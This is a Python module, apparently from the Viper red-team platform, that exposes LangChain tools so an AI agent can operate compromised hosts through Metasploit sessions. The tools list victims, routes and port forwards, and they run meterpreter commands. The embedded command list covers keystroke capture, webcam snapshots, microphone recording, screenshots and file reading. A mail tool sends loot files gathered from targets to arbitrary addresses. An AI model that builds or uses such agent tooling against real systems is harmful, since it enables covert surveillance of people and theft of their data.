import json
from typing import Annotated, Literal

from langchain_core.tools import tool

from Core.Handle.host import Host
from Lib.mailapi import MailAPI
from Lib.sessionlib import SessionLib
from Lib.xcache import Xcache
from Msgrpc.Handle.filemsf import FileMsf
from Msgrpc.Handle.handler import Handler
from Msgrpc.Handle.portfwd import PortFwd
from Msgrpc.Handle.route import Route
from Msgrpc.Handle.session import Session
from Msgrpc.Handle.sessionio import SessionIO


def slim_processes(processes):
    new_processes = []
    unused_process_name_list = ["[System Process]", "svchost.exe", "csrss.exe", "RuntimeBroker.exe", "conhost.exe"]
    for one_process in processes:
        one_process.pop("session")
        if one_process.get("name") in unused_process_name_list:
            continue
        else:
            new_processes.append(one_process)
    return new_processes


def slim_netstat(netstat):
    new_netstat = []
    for one_netstat in netstat:
        one_netstat.pop("uid")
        one_netstat.pop("inode")
        local_ip = one_netstat["local_addr"].split(":")[0]
        if local_ip in ["127.0.0.1"]:
            continue
        new_netstat.append(one_netstat)
    return new_netstat


@tool
def function_call_debug(
        magic_num: Annotated[int, "随机种子数字"] = 99
) -> Annotated[str, "生成的随机字符串"]:
    """
    生成调试用的内部测试字符串
    每当用户需要输出测试字符串,调用该函数.
    例如用户提问'给我测试字符串'
    """
    return f"This-is-a-test-function-to-debug_function_call-The-magic-number-is-{magic_num * 10}."


@tool
def get_session_host_info(
        session_host_ip: Annotated[str, "session的host ipaddress"] = None
) -> Annotated[str, "session所在主机的详细运行信息,json格式"]:
    """
    通过session的host ip获取主机的详细信息(进程,网络连接,权限等全面信息)
    每当用户需要根据主机IP获取主机的详细信息,调用该函数.
    例如用户提问'我需要255.255.255.255主机的详细信息'
    """
    result = Xcache.get_module_result(ipaddress=session_host_ip, loadpath="MODULES.HostBaseInfoModule")
    result_text = result.get("result")
    if result_text is None:
        return "Can not find information"
    host_info = json.loads(result_text)
    host_info["PROCESSES"] = slim_processes(host_info["PROCESSES"])
    host_info["NETSTAT"] = slim_netstat(host_info["NETSTAT"])

    host_info.pop("useful_processes")

    host_info.pop("listen_address")
    host_info.pop("public_ipaddress")
    host_info.pop("private_ipaddress")

    return json.dumps(host_info)


@tool
def get_session_info(
        session_id: Annotated[int, "session_id,例如session 1表示session_id 为 1"],
        rightinfo: Annotated[bool, "获取权限相关信息"] = True,
        uacinfo: Annotated[bool, "获取UAC相关信息"] = True,
        pinfo: Annotated[bool, "获取Session所在进程信息及系统所有进程列表"] = False,

) -> Annotated[str, "session详细信息,json格式"]:
    """
    获取session相关的详细配置信息
    每当用户需要根据session id获取session详细配置信息,调用该函数.
    例如用户提问'我需要session 1的进程列表'
    """
    session = SessionLib(sessionid=session_id, rightinfo=rightinfo, uacinfo=uacinfo, pinfo=pinfo)
    return session.to_json()


# handler
@tool
def list_handler() -> Annotated[str, "平台所有的handler(监听)配置信息,json格式"]:
    """
    获取平台所有的handler配置信息
    每当用户需要获取平台handler(监听)的配置信息,调用该函数.
    例如用户提问'我需要所有handler(监听)配置'
    """
    context = Handler.list()
    return json.dumps(context)


@tool
def list_session() -> Annotated[str, "平台所有存活的session列表,json格式"]:
    """
    返回平台当前session列表及session的简要信息
    每当用户需要获取平台所有session的配置信息,调用该函数.
    例如用户提问'我需要平台的session列表'
    """
    sessions = Session.list_sessions()
    return json.dumps(sessions)


@tool
def list_host() -> Annotated[str, "平台所有存活的host列表,json格式"]:
    """
    返回平台当前host列表及host的简要信息(host的路由路径及开放端口)
    每当用户需要获取平台所有host信息,调用该函数.
    例如用户提问'我需要平台的host列表'
    """
    hosts = Host.list_hosts_with_route_and_portservice()
    return json.dumps(hosts)


# 内网路由
@tool
def list_route() -> Annotated[str, "平台所有route配置列表,json格式"]:
    """
    返回平台当前host列表及host的简要信息(host的路由路径及开放端口)
    每当用户需要获取平台所有host信息,调用该函数.
    例如用户提问'我需要平台的host列表'
    """
    route_list = Route.list_route()
    return json.dumps(route_list)


@tool
def query_route_by_ipaddress(
        ipaddress: Annotated[str, "需要查询的ip地址,例如10.10.10.10"],
) -> Annotated[str, "viper连接输入ip时使用的路由配置,json格式"]:
    """
    返回平台连接该ip时使用的路由配置
    每当用户需要查询连接某个ip时平台的路由配置时,调用该函数.
    例如用户提问'viper连接10.10.10.10时使用哪个session路由'
    """
    route_config = Route.get_match_route_for_ipaddress_list([ipaddress])
    return json.dumps(route_config)


@tool
def query_port_forward_config() -> Annotated[str, "viper平台的端口转发配置,json格式"]:
    """
    返回平台当前的端口转发配置
    每当用户需要查询平台端口转发配置时,调用该函数.
    例如用户提问'viper平台当前的端口转发配置'
    """
    portfwd_config = PortFwd.list_portfwd()
    return json.dumps(portfwd_config)


# 模块历史记录


meterpreter_cmd_list = [
    {"cmd": "screenshot", "desc": "Grab a screenshot of the current interactive desktop.", "args": ["-q  The JPEG image quality (Default: '50')"]},

    {"cmd": "webcam_list", "desc": "List webcams.Return webcam index num and name", "args": []},
    {"cmd": "webcam_snap", "desc": "Take a snapshot from the specified webcam.", "args": ["-i   The index of the webcam to use (Default: 1)"]},

    {"cmd": "record_mic", "desc": "Record audio from the default microphone for X seconds.", "args": ["-d   Number of seconds to record (Default: 1)"]},
    {"cmd": "play", "desc": "play a waveform audio file (.wav) on the target system", "args": []},

    {"cmd": "keyscan_start", "desc": "Start capturing keystrokes", "args": []},
    {"cmd": "keyscan_stop", "desc": "Stop capturing keystrokes", "args": []},
    {"cmd": "keyscan_dump", "desc": "Dump the keystroke buffer", "args": []},

    {"cmd": "cd", "desc": "Change directory ", "args": ["file directory (e.g.: to desktop,use cd %HomePath%/Desktop,to root, use cd /root/)"]},
    {"cmd": "cat", "desc": "Read the contents of a file to the screen", "args": ["file path"]},
    {"cmd": "ls", "desc": "List files", "args": ["file directory"]},
]


@tool
def session_meterpreter_run(
        session_id: Annotated[int, "session_id,例如session 1表示session id 为 1"],
        cmd_with_args: Annotated[str, f"meterpreter命令,可以带参数. 参考命令列表:{meterpreter_cmd_list}"] = None,
) -> Annotated[str, "session meterpreter命令执行结果,json格式"]:
    """
    在session上执行meterpreter命令,并返回命令执行结果,命令只能原子化执行,无法使用&&等连接执行(即不支持Linux命令行格式)
    每当用户需要通过session执行命令或操作时,调用该函数.
    例如用户提问'我需要session 1所在机器的屏幕截图'
    """
    sessions = SessionIO.run(session_id, cmd_with_args)
    return str(sessions)


@tool
def send_mail_api(
        mail_to: Annotated[str, "邮件收件人,例如: test@gmail.com"],
        mail_subject: Annotated[str, "邮件标题"],
        mail_content: Annotated[str, "邮件内容"],
        mail_content_subtype: Annotated[Literal['plain', 'html'], "邮件的内容格式"],
        mail_attachment_filenames: Annotated[list, "邮件的附件,必须是`文件列表`中文件名,需用户提前上传到viper的`文件列表`"]
) -> Annotated[str, "邮件发送是否成功"]:
    """
    调用后台API接口发送邮件
    每当用户或平台需要发送邮件时,调用该函数.
    例如用户提问'发送写好的邮件给test@gmail.com'
    """
    mail_api = MailAPI()
    flag, execption = mail_api.init_by_config()
    if flag is not True:
        return "邮件发送失败,初始化邮件配置失败,请检查SMTP配置"
    attachments = []
    for mail_attachment_filename in mail_attachment_filenames:
        bin_data = FileMsf.read_loot_file(mail_attachment_filename)
        if bin_data is None:
            continue
        else:
            attachments.append({"bin": bin_data, "filename": mail_attachment_filename})

    flag = mail_api.send_mail(mail_to, mail_subject, mail_content, mail_content_subtype, attachments)
    if flag:
        return "邮件发送成功"
    else:
        return "SMTP配置正常,但邮件发送失败"
